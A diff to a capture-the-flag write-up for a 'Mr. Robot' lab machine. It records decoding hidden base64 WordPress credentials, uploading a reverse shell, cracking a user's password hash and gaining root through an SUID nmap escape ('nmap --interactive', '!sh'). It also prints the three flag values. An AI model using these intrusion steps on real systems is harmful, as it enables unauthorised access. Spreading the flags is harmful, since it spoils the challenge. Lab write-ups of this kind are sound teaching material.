@@ -1,6 +1,6 @@
 # Mr. Robot CTF
 
-> Mihai Stanciu | 30 January 2021
+> Mihai Stanciu | 2 January 2021
 
 ```
 export ip=10.10.47.32
@@ -30,4 +30,42 @@ key-1-of-3.txt
 
 ```
 073403c8a58a1f80d943455fb30724b9
+```
+
+## Found `ZWxsaW90OkVSMjgtMDY1Mgo=` on `/license` - hidden
+
+* Decrypted with base64 -- `elliot:ER28-0652`
+
+* Found `Editor` tab in WordPress
+
+* Uploaded a reverse shell to it
+
+* Found password file in `/home/robot` - `robot:c3fcd3d76192e4007dfb496cca67e13b`
+
+* Decrypted it to `robot:abcdefghijklmnopqrstuvwxyz`
+
+## With the reverse shell I am user `daemon` with low privelages
+
+* I have the user `robot`'s password
+
+* Used command `su - robot` and typed in the password
+
+* Now I can access `/home/robot/key-2-of-3.txt`
+
+```
+822c73956184f694993bede3eb39f959
+```
+
+## Found `nmap` SUID through `find / -user root -per /4000 2>/dev/null`
+
+* Found vulnerability with [GTFOBins](https://gtfobins.github.io/#)
+```
+nmap --interactive
+nmap> !sh
+```
+
+**Note:** I am now _root_ so I have access to `/root/key-3-of-3.txt`
+
+```
+04787ddef27c3dee1ee161b21670b4e4
 ```
